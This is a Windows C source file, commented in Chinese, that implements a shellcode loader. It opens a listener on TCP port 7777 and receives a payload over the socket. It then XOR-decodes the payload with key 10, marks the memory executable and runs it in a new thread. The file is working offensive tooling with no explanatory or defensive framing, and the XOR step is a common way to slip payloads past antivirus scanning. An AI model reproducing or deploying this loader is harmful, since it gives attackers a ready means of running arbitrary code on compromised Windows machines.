#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include <intrin.h>

#pragma comment(lib,"ws2_32.lib")

BOOL RunCode(CHAR* code, DWORD dwCodeLen)
{
    HANDLE hThread;
    DWORD dwOldProtect;
    DWORD dwThreadId;
    PCHAR pszShellcode = (PCHAR)VirtualAlloc(NULL, dwCodeLen, MEM_COMMIT, PAGE_READWRITE);
    CopyMemory(pszShellcode, code, dwCodeLen);

    for (DWORD i = 0; i < dwCodeLen; i++) {
        _InterlockedXor8(pszShellcode + i, 10);
    }
    // 这里开始更改它的属性为可执行
    VirtualProtect(pszShellcode, dwCodeLen, PAGE_EXECUTE, &dwOldProtect);
    // 执行Shellcode
    hThread = CreateThread(
        NULL, // 安全描述符
        NULL, // 栈的大小
        (LPTHREAD_START_ROUTINE)pszShellcode, // 函数
        NULL, // 参数
        NULL, // 线程标志
        &dwThreadId // 线程ID
    );
    WaitForSingleObject(hThread, INFINITE);
    return TRUE;
}

int wmain(int argc, TCHAR argv[]) {
    CHAR buf[801];
    DWORD dwError;
    WORD sockVersion = MAKEWORD(2, 2);
    WSADATA wsaData;
    SOCKET socks;                       
    SOCKET sClient;                     // recv等待成功后会返回一个新的套接字
    struct sockaddr_in s_client;        // 接收连接实体的地址
    INT nAddrLen = sizeof(s_client);    // 一个指向整数的可选指针，该整数包含由addr参数指向的结构的长度
    SHORT sListenPort = 7777;
    struct sockaddr_in sin;

    if (WSAStartup(sockVersion, &wsaData) != 0)
    {
        dwError = GetLastError();
        printf("[*]WSAStarup Error : %d \n", dwError);
        return dwError;
    }

    socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (socks == INVALID_SOCKET)
    {
        dwError = GetLastError();
        printf("[*]Socket Error : %d \n", dwError);
        return dwError;
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(sListenPort);
    sin.sin_addr.S_un.S_addr = INADDR_ANY;  // INADDR_ANY就是指定地址为0.0.0.0的地址 因为他是监听

    if (bind(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
    {
        dwError = GetLastError();
        printf("[*]Bind Error : %d \n", dwError);
        return dwError;
    }

    if (listen(socks, 5) == SOCKET_ERROR)   // 监听
    {
        dwError = GetLastError();
        printf("[*]Listen  Error : %d \n", dwError);
        return dwError;
    }

    sClient = accept(socks, (SOCKADDR*)&s_client, &nAddrLen);   // 接受要发过来的请求
    int ret = recv(sClient, buf, sizeof(buf), 0);   // 接收数据 shellcode
    if (ret > 0)    // 如果接收成功，关闭两个套接字
    {
        printf("[+]Recv %d-Bytes \n", ret);
        closesocket(sClient);
        closesocket(socks);
    }

    WSACleanup();   // 关闭
    RunCode(buf, sizeof(buf));  // 然后加载shellcode
    return 0;
}